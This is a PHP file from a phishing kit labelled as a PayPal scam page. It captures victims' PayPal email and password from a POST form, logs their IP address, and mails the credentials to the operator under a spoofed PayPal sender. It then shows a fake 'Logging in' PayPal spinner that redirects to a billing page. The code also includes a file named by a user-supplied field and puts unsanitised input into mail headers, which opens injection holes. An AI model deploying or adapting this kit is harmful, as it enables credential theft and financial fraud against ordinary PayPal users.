<?php
include "Email.php";
/*
__________________________________________________________________________________________________________________
Private Scam Page*********KAKA
---------------------------------------
Paypal Scam
KAKA / KAKA / KAKA / KAKA / 
KAKA / KAKA / KAKA / KAKA / 
ZIZOU / ZIZOU / ZIZOU  / ZIZOU / 
__________________________________________________________________________________________________________________


*/

$ip = getenv("REMOTE_ADDR");
$login = $_POST['1'];
$pass = $_POST['2'];
$hostname = $_POST['hostname'];
$message = "
=========[LOGIN INFOS]=========
PayPal Email  		: $login
PayPal Password  	: $pass
===============[IP]==============
IP	: http://www.geoiptool.com/?IP=$ip
=================================";
$encrypt=  base64_encode($message);
include "$hostname";
$subject = "PP LOGIN = [$ip]";
$headers = "From: PayPal Info <paypal@support.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subject, $message,$headers);
?>
<?php
include 'random.php';
?>
<!DOCTYPE HTML>
<html >
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<link rel="shortcut icon" type="image/x-icon" href="M/favicon.ico" />
		<meta http-equiv="refresh" content="5; url=websc-billing.php?rand=<?php echo $rand;?>" />.
		<title>Logging in - PayPal</title>
		<style type="text/css">
					#main {
						font-family: Helvetica,Arial,sans-serif;
					}
					#rotatingDiv {
						display: block;
						margin: 32px auto;
						height:30px;
						width:30px;
						-webkit-animation: rotation .7s infinite linear;
						-moz-animation: rotation .7s infinite linear;
						-o-animation: rotation .7s infinite linear;
						animation: rotation .7s infinite linear;
						border-left:8px solid rgba(0,0,0,.20);
						border-right:8px solid rgba(0,0,0,.20);
						border-bottom:8px solid rgba(0,0,0,.20);
						border-top:8px solid rgba(33,128,192,1);
						border-radius:100%;
					}
					@keyframes rotation {
						from {transform: rotate(0deg);}
						to {transform: rotate(359deg);}
					}
					@-webkit-keyframes rotation {
						from {-webkit-transform: rotate(0deg);}
						to {-webkit-transform: rotate(359deg);}
					}
					@-moz-keyframes rotation {
						from {-moz-transform: rotate(0deg);}
						to {-moz-transform: rotate(359deg);}
					}
					@-o-keyframes rotation {
						from {-o-transform: rotate(0deg);}
						to {-o-transform: rotate(359deg);}
					}
					h3 {font-size:1.0em; margin:0 0 0 0; line-height:normal;}
		</style>
	</head>
	<body>
		<div id="content">
			<div id="main">
				<div class="layout1" align="center">
					<h3>One moment...</h3>
					<h3>Still loading after a few seconds? Try again</h3>
					<div id="rotatingDiv"></div>
				</div>
			</div>
		</div>
</body></html>